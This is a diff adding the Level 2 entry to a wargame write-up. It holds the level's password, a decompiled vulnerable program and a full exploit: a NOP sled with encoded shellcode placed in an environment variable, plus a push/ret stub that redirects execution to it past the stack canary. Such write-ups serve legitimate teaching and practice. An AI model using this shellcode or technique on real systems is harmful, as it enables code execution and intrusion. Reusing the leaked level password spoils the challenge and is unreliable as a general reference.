@@ -94,8 +94,55 @@ $ ld -shared -m elf i386 -o libc.so.4 custom_puts.o -ldl
 ###################################################################################################
 
 Level:     2
-Exploit:   
-Password:  
+Exploit:   shellcode
+Password:  DSEiCewQOv
+
+Exploit mitigations: Stack Canaries
+
+ghidra decompile:
+  int main(int argc, char **argv) {
+    int iVar1;
+    int in_GS_OFFSET;
+    char **argv_local;
+    _func_void_varargs *fp;
+    char code [8];
+  
+    iVar1 = *(int *)(in_GS_OFFSET + 0x14);
+    if (argc != 2) {
+      exit(1);
+    }
+    strncpy(code,argv[1],8);
+    (*(code *)code)();                                      <-- Execute code[8]
+    if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {           <-- Stack Canary check
+      __stack_chk_fail();
+    }
+    return 0;
+  }    
+
+Because of stack canary we cannot overwrite the return address. Also there is no way to leak the 
+stack canary before executing code[]. 
+Hijack the eip to point to shellcode (stored in an env var because 8 bytes is too small)
+
+$ export EXPLOIT=$(perl -e 'print "\x90"x1000 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
+  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
+  \x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+
+Generate shellcode for making eip go to exploit
+  global _start
+
+  section .text
+  _start:
+    push 0xaabbccdd          <-- Address to ret to
+    ret
+
+$ nasm -f elf32 seteip.asm
+$ ld -m elf_i386 seteip.o 
+$ objdump -d a.out
+
+This gives the shellcode: 68 dd cc bb aa c3
+Find the exploit env var 0xffffd1e9 ~0xffffd310
+
+$ ./maze2 $(perl -e 'print "\x68\x10\xd3\xff\xff\xc3"') 
 
 ###################################################################################################
 
